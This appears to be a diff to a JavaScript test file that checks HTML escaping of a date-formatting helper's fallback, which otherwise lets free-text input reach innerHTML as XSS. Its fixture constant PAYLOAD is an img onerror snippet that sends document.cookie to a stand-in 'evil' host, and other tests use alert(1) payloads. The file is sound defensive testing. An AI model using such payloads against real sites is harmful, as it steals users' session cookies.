@@ -4,9 +4,11 @@
  * cannot parse — "a malformed date should show as itself, not blank out the row
  * it is in" (public/js/gw_date.js). That is the right call for a date function.
  *
- * The problem is what the callers do with it. All 17 _p5FmtDate call sites in
- * app_premium.js interpolate the result straight into innerHTML, and one of
- * them renders `clients.since` — a FREE-TEXT input (app_premium.js:5462,
+ * The problem is what the callers do with it. There are 40 _p5FmtDate call
+ * sites in app_premium.js (an earlier version of this header said 17 — it was
+ * wrong, and the count was the whole argument for making the helper the choke
+ * point). 38 interpolate the result straight into innerHTML with no escaping,
+ * and one renders `clients.since` — a FREE-TEXT input (app_premium.js:5462,
  * placeholder "Jan 2025"), not a date picker, stored as TEXT by
  * migrations/0019_customer_detail.sql. So the fallback path is attacker
  * controlled:
@@ -17,10 +19,22 @@
  * client. On that very line `client.name` and `client.status` ARE escapeHtml'd,
  * so the omission was an oversight rather than a decision.
  *
- * Only the FALLBACK is escaped. A successfully formatted date comes out of Intl
- * from a parsed Date and contains nothing to escape, so escaping it would be a
- * no-op — and would double-escape at the two call sites that already escape
- * (_pqRow and _listRow escape their `sub` argument).
+ * Two entry points, because the callers differ:
+ *
+ *   _p5FmtDate      escapes — for the 38 sites that interpolate into innerHTML
+ *   _p5FmtDateText  does not — for _pqRow and _listRow, which escapeHtml their
+ *                   own `sub` argument
+ *
+ * The first version of this had one function and argued that escaping only the
+ * fallback avoided double-escaping at those two. That was backwards: the
+ * fallback is the ONLY branch that ever reaches them carrying a special
+ * character, so "Q3 '25" arrived on the mobile Financial Hub as the literal
+ * text "Q3 &#039;25". XS-07 pins that.
+ *
+ * The raw path is detected with `out === String(d)`, not by re-parsing.
+ * gwDateFormat has TWO raw returns — the parse failure and the catch around
+ * toLocaleDateString — and re-parsing only saw the first, so a throw inside
+ * Intl returned the raw value UNESCAPED. XS-08 pins that.
  *
  * Run: node --test tests/date-render-escaping.test.mjs
  */
@@ -41,7 +55,8 @@ function region(source, startMarker, endMarker, label) {
 
 // The real functions, out of the real files — never a stub.
 const escapeHtmlSrc = region(appSource, 'function escapeHtml', '\nfunction ', 'escapeHtml');
-const fmtDateSrc = region(appSource, 'function _p5FmtDate', '\nfunction ', '_p5FmtDate');
+// Both variants live between _p5FmtDate and _p5Initials.
+const fmtDateSrc = region(appSource, 'function _p5FmtDate', 'function _p5Initials', '_p5FmtDate');
 
 /*
  * gw_date.js is an IIFE that assigns onto `window`, so simply concatenating it
@@ -58,15 +73,25 @@ function build() {
     const { gwDateParse, gwDateFormat } = window.gwDate;
     ${escapeHtmlSrc}
     ${fmtDateSrc}
-    return _p5FmtDate;
+    return { _p5FmtDate, _p5FmtDateText };
   `)({});
 }
-const _p5FmtDate = build();
+const { _p5FmtDate, _p5FmtDateText } = build();
 
 test('XS-00 the harness really has the parser in scope', () => {
   // Guards the trap above: if this fails, every assertion below is testing the
   // gw_date.js-is-missing branch and proves nothing about normal operation.
-  assert.equal(_p5FmtDate('2026-09-01'), 'Sep 1, 2026');
+  //
+  // Compared against Intl's own output rather than the literal 'Sep 1, 2026':
+  // gwDateFormat passes `undefined` as the locale, so it follows the ambient
+  // one, and test:browser-js pins TZ but not LANG. The hard-coded string failed
+  // under en_GB ('1 Sept 2026') and de-DE ('1. Sept. 2026') with a message
+  // claiming the harness was broken.
+  const expected = new Date(2026, 8, 1, 12).toLocaleDateString(undefined, {
+    month: 'short', day: 'numeric', year: 'numeric',
+  });
+  assert.equal(_p5FmtDate('2026-09-01'), expected);
+  assert.notEqual(expected, '2026-09-01', 'the value was not formatted at all');
 });
 
 const PAYLOAD = `<img src=x onerror=fetch('//evil/?c='+document.cookie)>`;
@@ -116,14 +141,56 @@ test('XS-05 an empty value is still the em dash, not an escaped empty string', (
   assert.equal(_p5FmtDate(''), '—');
 });
 
-test('XS-06 every _p5FmtDate call site is inside an escaping context or the helper escapes', () => {
-  // The helper is the choke point precisely because the call sites are not
-  // individually guarded — 17 of them, 15 interpolating with no escapeHtml.
-  // If someone reverts the helper, this says why that is not safe.
-  const guarded = /const parsed = \(typeof gwDateParse === 'function'\) \? gwDateParse\(d\) : null;[\s\S]{0,120}escapeHtml\(out\)/;
-  assert.match(
-    fmtDateSrc, guarded,
-    '_p5FmtDate no longer escapes its raw fallback, but its call sites still ' +
-    'interpolate the result into innerHTML unescaped — see this file\'s header',
+test('XS-06 the escaping helper and the text helper differ only in escaping', () => {
+  // Behavioural, not a source-text regex. The previous version pinned the exact
+  // spelling of the implementation — and it matched an INVERTED version that
+  // escaped the safe Intl output and echoed the attacker-controlled raw value
+  // verbatim. A guard that passes against the bug it names is worse than none.
+  const payload = '<img src=x onerror=alert(1)>';
+  assert.equal(_p5FmtDateText(payload), payload, 'the text variant must NOT escape');
+  assert.equal(_p5FmtDate(payload), '&lt;img src=x onerror=alert(1)&gt;');
+  // On a value that parses, the two agree exactly — there is nothing to escape.
+  assert.equal(_p5FmtDate('2026-09-01'), _p5FmtDateText('2026-09-01'));
+});
+
+test('XS-07 a self-escaping caller gets exactly one escape, not two', () => {
+  // _pqRow and _listRow run escapeHtml over `sub`. Handing them the escaped
+  // form double-escaped precisely the values that carry special characters:
+  // "Q3 '25" rendered on the mobile Financial Hub as the literal "Q3 &#039;25".
+  const escapeHtml = new Function(`${escapeHtmlSrc}\nreturn escapeHtml;`)();
+  for (const raw of ["Q3 '25", 'since 2020 & going', '<img src=x>']) {
+    const asCallerRenders = escapeHtml(_p5FmtDateText(raw));
+    assert.equal(asCallerRenders, escapeHtml(raw), `double-escaped: ${asCallerRenders}`);
+    assert.doesNotMatch(asCallerRenders, /&amp;(lt|gt|quot|#0?39);/, 'entity was escaped twice');
+  }
+});
+
+test('XS-08 the raw path is detected by comparison, not by a second parse', () => {
+  // gwDateFormat has TWO raw returns: the parse failure, and the catch around
+  // toLocaleDateString. Asking gwDateParse again only saw the first, so a throw
+  // inside Intl returned the raw value unescaped. `out === String(d)` covers
+  // both, and parses once.
+  assert.doesNotMatch(fmtDateSrc, /gwDateParse\(d\)/,
+    '_p5FmtDate re-parses to decide whether to escape — that misses the catch path');
+  assert.match(fmtDateSrc, /out === String\(d\)/);
+});
+
+test('XS-09 no direct gwDateFormat call reaches innerHTML unescaped', () => {
+  // The class, not the one function. dateStr in superAdmin() was the last
+  // direct consumer echoing gwDateFormat's fallback into innerHTML raw; every
+  // other direct call site already wrapped in escapeHtml.
+  //
+  // The two helpers are excluded because they ARE the escaping boundary —
+  // _p5FmtDate escapes what gwDateFormat returns, and _p5FmtDateText is
+  // deliberately raw for callers that escape themselves (XS-06, XS-07).
+  const outside = appSource.split(fmtDateSrc).join('\n');
+  const unescaped = outside.split('\n').filter(l =>
+    /[^_a-zA-Z]gwDateFormat\(/.test(l) &&
+    !/escapeHtml\(/.test(l) &&
+    !/^\s*(\/\/|\*)/.test(l),
+  );
+  assert.deepEqual(
+    unescaped.map(l => l.trim().slice(0, 70)), [],
+    'these call gwDateFormat without escaping its raw fallback',
   );
 });
